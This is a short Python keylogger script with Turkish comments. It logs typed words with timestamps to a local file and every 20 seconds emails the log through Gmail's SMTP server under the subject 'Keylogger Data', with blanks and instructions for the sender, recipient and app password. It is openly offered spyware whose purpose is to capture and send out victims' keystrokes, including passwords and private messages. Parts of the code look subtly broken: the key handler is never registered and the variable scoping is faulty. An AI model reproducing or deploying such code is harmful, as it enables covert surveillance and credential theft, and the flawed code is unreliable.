import keyboard
import datetime
import smtplib
from email.mime.text import MIMEText
import time

word = ""
interval = 20 #Mail Gönderme Saniyesi.

with open("key_log.txt", "w") as file:
    file.write("")

def on_press(key):
    if key == keyboard.K_ESCAPE:
        return False
    elif key.name in ["space", "enter"]:
        with open("key_log.txt", "a") as file:
            file.write(word + " " + "Girilme Tarihi= " + str(datetime.datetime.now()) + "\n")
            word = ""
    else:
        if key.char.isalnum():
            word += key.char

while True:
    with open("key_log.txt", "r") as file:
        data = file.read()

    if data:
        msg = MIMEText(data)
        msg["Subject"] = "Keylogger Data" #Mail ADI İstediğiniz Gibi Yapa Bilirsiniz
        msg["From"] = "" #Gönderen Kişinin Emaili.
        msg["To"] = "" #Alıcının Emaii.

        mail = smtplib.SMTP("smtp.gmail.com", 587) #!!BÜTÜN MAİLER GEÇERLİDİR YAHOO PRTON MAİL YANDEX MAİL [587 İse Port !!MAİLLERİN HEPSİNDE FARKLI PORTLAR VARDIR.]
        mail.ehlo()
        mail.starttls()
        mail.login("", "") #Gönderen Kişinin Emaili ve Uygulama Şifresi
        mail.sendmail("", "", msg.as_string())
        mail.close()

        with open("key_log.txt", "w") as file:
            file.write("")

        time.sleep(interval)
